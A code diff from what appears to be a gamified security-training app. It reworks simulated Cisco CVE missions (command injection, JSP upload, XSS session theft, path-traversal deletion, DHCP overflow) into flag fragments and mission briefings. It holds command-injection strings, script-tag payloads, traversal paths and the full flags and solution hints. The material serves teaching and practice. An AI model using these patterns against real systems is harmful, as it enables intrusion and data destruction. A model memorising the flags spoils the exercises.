             "radius-secret: Alhambra@Granada22",
             "",
-            "classified-key: FLAG{WLC_4UTH_BYPA55_CVE_2022}",
+            "Run 'assemble' to retrieve your fragment.",
           ],
-          solved: true,
         }),
       },
     },
@@ -2964,13 +3101,31 @@ curl -X POST https://hx-node/hxinstall/install \\
       scenario: "Cisco HyperFlex — the hyperconverged infrastructure platform managing enterprise data center compute, storage, and networking — was disclosed with a CVSS 9.8 command injection in May 2021. The provisioning API passes a URL parameter directly to a shell command without sanitizing special characters. Unauthenticated. Root on the node. For APT groups targeting data center infrastructure, this is the kind of access ransomware deployments and long-term implants are built on. Inject through the URL parameter.",
       hint: "The provisioning API passes the URL parameter to a shell command. Append your own command after a semicolon — both will execute.",
       hints: [
+        "Read the mission briefing. Run: cat briefing.txt",
         "Send a clean request to see the API's normal response. Run: send-payload http://repo.local/pkg.tar",
         "Special characters aren't filtered. Try: send-payload http://repo.local/pkg.tar;whoami",
         "Read the classified file. Run: send-payload http://repo.local/pkg.tar;cat /ops/classified.txt",
+        "Run 'assemble' to see collected fragments, then submit the flag",
       ],
       flag: "FLAG{HYP3RFL3X_CMD_1NJ3CT10N}",
-      files: {},
-      dirs: { "/": [] },
+      fragments: [
+        { trigger: "/briefing.txt", value: "FLAG{HYP3RFL3X_", label: "Mission Brief — Krak des Chevaliers HyperFlex" },
+        { trigger: "send-payload http://repo.local/pkg.tar;whoami", value: "CMD_", label: "Command Injected — Root Confirmed" },
+        { trigger: "send-payload http://repo.local/pkg.tar;cat /ops/classified.txt", value: "1NJ3CT10N}", label: "Classified File Read — Data Center Compromised" },
+      ],
+      files: {
+        "/briefing.txt": [
+          "OPERATION: KRAK DES CHEVALIERS",
+          "Target: Cisco HyperFlex command injection — CVE-2021-1497",
+          "CVSS: 9.8  No authentication required",
+          "",
+          "The provisioning API passes URL parameter to shell — no sanitization.",
+          "Exploitation sequence: send-payload http://repo.local/pkg.tar;whoami → ;cat /ops/classified.txt",
+        ].join("\n"),
+      },
+      dirs: {
+        "/": [{ name: "briefing.txt", isDir: false }],
+      },
       extraCommands: {
         "send-payload": (args) => {
           const input = args.join(" ");
@@ -2986,9 +3141,9 @@ curl -X POST https://hx-node/hxinstall/install \\
                 `Executing as root: ${injected}`,
                 "",
                 injected.includes("who") ? "uid=0(root)" : "",
-                injected.includes("classified") || injected.includes("cat") ? "FLAG{HYP3RFL3X_CMD_1NJ3CT10N}" : "Command executed.",
+                injected.includes("classified") || injected.includes("cat") ? "Run 'assemble' to retrieve your fragment." : "Command executed.",
               ].filter(Boolean),
-              solved: injected.includes("classified") || injected.includes("cat"),
+              solved: false,
             };
           }
           return {
@@ -3093,14 +3248,32 @@ curl https://target/webui/menu.json \\
       scenario: "The October 2023 IOS XE campaign was a two-stage operation. CVE-2023-20198 created the backdoor account — that was Stage 1. CVE-2023-20273 chained an XSS flaw in the same web interface to escalate to root and install 'BadCandy': a Lua implant embedded in the IOS XE filesystem that survived reboots and answered commands via a magic HTTP token. Cisco patched both CVEs on October 22. The implant still had to be manually removed. Complete the chain.",
       hint: "Your admin session is active. Inject a payload through the web interface's input reflection to escalate to root, then deploy the persistent implant.",
       hints: [
+        "Read the mission briefing. Run: cat briefing.txt",
         "Confirm your current access level. Run: confirm-access",
         "Inject a payload via the web interface to escalate to root. Run: inject-payload <exec>escalate</exec>",
         "Deploy the persistent implant. Run: deploy-implant",
         "Verify the implant is live. Run: query-implant whoami",
+        "Run 'assemble' to see collected fragments, then submit the flag",
       ],
       flag: "FLAG{BADC4NDY_R00T_IMPL4NT}",
-      files: {},
-      dirs: { "/": [] },
+      fragments: [
+        { trigger: "/briefing.txt", value: "FLAG{BADC4NDY_", label: "Mission Brief — Machu Picchu IOS XE Chain" },
+        { trigger: "deploy-implant", value: "R00T_", label: "Implant Deployed — Persistent Root Access" },
+        { trigger: "query-implant whoami", value: "IMPL4NT}", label: "Implant Verified — BadCandy Live" },
+      ],
+      files: {
+        "/briefing.txt": [
+          "OPERATION: MACHU PICCHU",
+          "Target: Cisco IOS XE privilege escalation — CVE-2023-20273",
+          "CVSS: 7.2  Requires: level-15 account from CVE-2023-20198",
+          "",
+          "XSS in web UI escalates to root. Deploy BadCandy for persistence.",
+          "Exploitation sequence: confirm-access → inject-payload → deploy-implant → query-implant whoami",
+        ].join("\n"),
+      },
+      dirs: {
+        "/": [{ name: "briefing.txt", isDir: false }],
+      },
       extraCommands: {
         "confirm-access": () => ({
           lines: [
@@ -3143,9 +3316,8 @@ curl https://target/webui/menu.json \\
               "",
               cmd.includes("who") ? "uid=0(root) — implant confirmed live" : `Output: ${cmd}`,
               "",
-              "FLAG{BADC4NDY_R00T_IMPL4NT}",
+              "Run 'assemble' to retrieve your fragment.",
             ],
-            solved: true,
           };
         },
       },
@@ -3242,14 +3414,32 @@ curl -k "https://prime-infra/shell.jsp?cmd=id"
       scenario: "Cisco Prime Infrastructure is the nerve center of enterprise Cisco networks — one compromise exposes credentials for every router, switch, and access point it manages. CVE-2019-1821 gave unauthenticated attackers file upload to root via the health monitoring endpoint. Nation-state operators actively target network management platforms because a single foothold cascades into total network visibility. Upload the payload. Own the platform.",
       hint: "The health endpoint takes unauthenticated file uploads. Upload a .jsp payload, then execute it to get a root shell.",
       hints: [
+        "Read the mission briefing. Run: cat briefing.txt",
         "Probe the server to confirm the unauthenticated upload endpoint. Run: probe-server",
         "Upload your payload to the health endpoint. Run: upload-payload agent.jsp",
         "Execute the payload to get a root shell. Run: execute-payload whoami",
         "Pull the classified records. Run: execute-payload cat /ops/classified.txt",
+        "Run 'assemble' to see collected fragments, then submit the flag",
       ],
       flag: "FLAG{PR1M3_1NFR4_RCE_UPL04D}",
-      files: {},
-      dirs: { "/": [] },
+      fragments: [
+        { trigger: "/briefing.txt", value: "FLAG{PR1M3_", label: "Mission Brief — Chichen Itza Prime Infrastructure" },
+        { trigger: "upload-payload agent.jsp", value: "1NFR4_", label: "Payload Uploaded — JSP Shell Placed" },
+        { trigger: "execute-payload cat /ops/classified.txt", value: "RCE_UPL04D}", label: "Root Shell — Classified Records Retrieved" },
+      ],
+      files: {
+        "/briefing.txt": [
+          "OPERATION: CHICHEN ITZA",
+          "Target: Cisco Prime Infrastructure file upload — CVE-2019-1821",
+          "CVSS: 9.8  No authentication required",
+          "",
+          "The health endpoint accepts unauthenticated .jsp uploads.",
+          "Exploitation sequence: probe-server → upload-payload agent.jsp → execute-payload whoami → execute-payload cat /ops/classified.txt",
+        ].join("\n"),
+      },
+      dirs: {
+        "/": [{ name: "briefing.txt", isDir: false }],
+      },
       extraCommands: {
         "probe-server": () => ({
           lines: [
@@ -3280,9 +3470,9 @@ curl -k "https://prime-infra/shell.jsp?cmd=id"
               `Executing payload: ${cmd}`,
               "",
               cmd.includes("who") ? "uid=0(root) — full server access" : "",
-              cmd.includes("classified") || cmd.includes("cat") ? "FLAG{PR1M3_1NFR4_RCE_UPL04D}" : `${cmd}: executed`,
+                cmd.includes("classified") || cmd.includes("cat") ? "Run 'assemble' to retrieve your fragment." : `${cmd}: executed`,
             ].filter(Boolean),
-            solved: cmd.includes("classified") || cmd.includes("cat"),
+            solved: false,
           };
         },
       },
@@ -3380,14 +3570,32 @@ fetch('/api/v1/users', {method:'POST',
       scenario: "APT spear-phishing campaigns routinely target network administrators — and when the target device has an XSS vulnerability in its own management interface, a single crafted link is all it takes. CVE-2020-3580 reflects unsanitized input through the Cisco ASA web interface. When an admin clicks a malicious URL, the script runs in their authenticated session — handing the attacker full firewall access through the admin's own browser. No credentials. No brute force. One link.",
       hint: "The error message parameter reflects unsanitized input. Craft a script payload, test it, then deliver the URL to the admin.",
       hints: [
+        "Read the mission briefing. Run: cat briefing.txt",
         "Test the reflection — see if your input comes back unmodified. Run: craft-payload test123",
         "Try a script tag to see if it executes. Run: craft-payload <script>alert(1)</script>",
         "Craft a payload that reads the admin's session token. Run: craft-payload <script>steal-session</script>",
         "Deliver the payload URL to the admin. Run: deliver-to-admin <script>steal-session</script>",
+        "Run 'assemble' to see collected fragments, then submit the flag",
       ],
       flag: "FLAG{ASA_XSS_S3SS10N_H1JACK}",
-      files: {},
-      dirs: { "/": [] },
+      fragments: [
+        { trigger: "/briefing.txt", value: "FLAG{ASA_", label: "Mission Brief — Mont-Saint-Michel ASA XSS" },
+        { trigger: "craft-payload <script>steal-session</script>", value: "XSS_S3SS10N_", label: "Payload Confirmed — Script Executes in Admin Context" },
+        { trigger: "deliver-to-admin <script>steal-session</script>", value: "H1JACK}", label: "Session Hijacked — Admin Cookie Intercepted" },
+      ],
+      files: {
+        "/briefing.txt": [
+          "OPERATION: MONT-SAINT-MICHEL",
+          "Target: Cisco ASA/FTD reflected XSS — CVE-2020-3580",
+          "CVSS: 6.1  Requires: admin to click malicious link",
+          "",
+          "The ASA web interface reflects unsanitized input in the errMsg parameter.",
+          "Exploitation sequence: craft-payload <script>steal-session</script> → deliver-to-admin <script>steal-session</script>",
+        ].join("\n"),
+      },
+      dirs: {
+        "/": [{ name: "briefing.txt", isDir: false }],
+      },
       extraCommands: {
         "craft-payload": (args) => {
           const input = args.join(" ");
@@ -3428,10 +3636,9 @@ fetch('/api/v1/users', {method:'POST',
               lines: [
                 "Payload URL delivered to admin@mont-saint-michel...",
                 "Admin opened the link — script executed in their session.",
-                "Session token intercepted:",
-                "  admin_session=FLAG{ASA_XSS_S3SS10N_H1JACK}",
+                "Session token intercepted: admin_session=[captured]",
+                "Run 'assemble' to retrieve your fragment.",
               ],
-              solved: true,
             };
           }
           return { lines: ["Admin reviewed the link — no script executed. Include a <script> payload."] };
@@ -3527,13 +3734,31 @@ curl -k -X DELETE \\
       scenario: "CVE-2020-3187 is CVE-2020-3452's destructive sibling — the same path traversal, but with HTTP DELETE instead of GET. During the COVID VPN surge, both were chained: steal the credentials with a read, then destroy the config file to deny defenders access to their own infrastructure. Unauthenticated. No trace beyond the deletion itself. Two objectives: read the VPN config, then wipe it.",
       hint: "Use path traversal (../) to navigate above the web root and reach the VPN config. Read it first, then delete it.",
       hints: [
+        "Read the mission briefing. Run: cat briefing.txt",
         "Survey the accessible file paths. Run: locate-file /files/",
-        "Traverse to the VPN config and read it — the classified key is inside. Run: read-file /files/../../vpn/config.dat",
+        "Traverse to the VPN config and read it. Run: read-file /files/../../vpn/config.dat",
         "Delete the config to complete the mission. Run: wipe-file /files/../../vpn/config.dat",
+        "Run 'assemble' to see collected fragments, then submit the flag",
       ],
       flag: "FLAG{3D1NBR0_F1L3_D3L3T3D}",
-      files: {},
-      dirs: { "/": [] },
+      fragments: [
+        { trigger: "/briefing.txt", value: "FLAG{3D1NBR0_", label: "Mission Brief — Edinburgh Castle File Deletion" },
+        { trigger: "read-file /files/../../vpn/config.dat", value: "F1L3_", label: "VPN Config Read — Credentials Exfiltrated" },
+        { trigger: "wipe-file /files/../../vpn/config.dat", value: "D3L3T3D}", label: "Config Deleted — Defenders Locked Out" },
+      ],
+      files: {
+        "/briefing.txt": [
+          "OPERATION: EDINBURGH CASTLE",
+          "Target: Cisco ASA WebVPN file deletion — CVE-2020-3187",
+          "CVSS: 9.1  No authentication required",
+          "",
+          "Same path traversal as CVE-2020-3452 but with HTTP DELETE.",
+          "Exploitation sequence: locate-file → read-file /files/../../vpn/config.dat → wipe-file /files/../../vpn/config.dat",
+        ].join("\n"),
+      },
+      dirs: {
+        "/": [{ name: "briefing.txt", isDir: false }],
+      },
       extraCommands: {
         "locate-file": (args) => ({
           lines: [
@@ -3568,9 +3793,8 @@ curl -k -X DELETE \\
                 "200 OK — file deleted",
                 "",
                 "VPN config gone. Defenders locked out of their own tunnel.",
-                "Both objectives complete.",
+                "Run 'assemble' to retrieve your fragment.",
               ],
-              solved: true,
             };
           }
           return { lines: [`DELETE ${path} — file not found. Traverse with ../../ to reach it.`] };
@@ -3670,14 +3894,32 @@ sendp(pkt, iface="eth0")
       scenario: "Network infrastructure protocol parsers are implemented in C and run at high privilege — the same class of vulnerability that enabled EternalBlue. CVE-2017-6736 is a buffer overflow in Cisco IOS's DHCP server: the option 82 field gets copied into a fixed-size buffer with no length check. Any device on the local network can send a DHCP packet. No credentials. No external access required. This is what lateral movement looks like once an adversary is already inside.",
       hint: "Send a normal DHCP packet first to confirm the server is live. Then send an oversized one to trigger the overflow.",
       hints: [
+        "Read the mission briefing. Run: cat briefing.txt",
         "Confirm the DHCP server is running. Run: probe-dhcp",
         "Send a normal packet to see the baseline response. Run: send-packet normal",
         "Send an oversized packet to overflow the buffer. Run: send-packet exploit 500",
         "Execute a command on the compromised device. Run: execute-command show-classified",
+        "Run 'assemble' to see collected fragments, then submit the flag",
       ],
       flag: "FLAG{10S_DHCP_BUFF3R_0V3RFL0W}",
-      files: {},
-      dirs: { "/": [] },
+      fragments: [
+        { trigger: "/briefing.txt", value: "FLAG{10S_", label: "Mission Brief — Topkapi IOS DHCP Target" },
+        { trigger: "send-packet exploit 500", value: "DHCP_", label: "Buffer Overflow — Option 82 Handler Corrupted" },
+        { trigger: "execute-command show-classified", value: "BUFF3R_0V3RFL0W}", label: "Device Owned — Classified Data Retrieved" },
+      ],
+      files: {
+        "/briefing.txt": [
+          "OPERATION: TOPKAPI PALACE",
+          "Target: Cisco IOS DHCP buffer overflow — CVE-2017-6736",
+          "Firmware: v15.6(2)T  CVSS: 8.8",
+          "",
+          "DHCP option 82 field has no length validation — overflow possible.",
+          "Exploitation sequence: probe-dhcp → send-packet exploit 500 → execute-command show-classified",
+        ].join("\n"),
+      },
+      dirs: {
+        "/": [{ name: "briefing.txt", isDir: false }],
+      },
       extraCommands: {
         "probe-dhcp": () => ({
           lines: [
@@ -3715,9 +3957,8 @@ sendp(pkt, iface="eth0")
             lines: [
               `Executing on device: ${cmd}`,
               cmd.includes("who") ? "uid=0(root) — full device access" : "",
-              "classified-key: FLAG{10S_DHCP_BUFF3R_0V3RFL0W}",
+              "Run 'assemble' to retrieve your fragment.",
             ].filter(Boolean),
-            solved: true,
           };
         },
       },
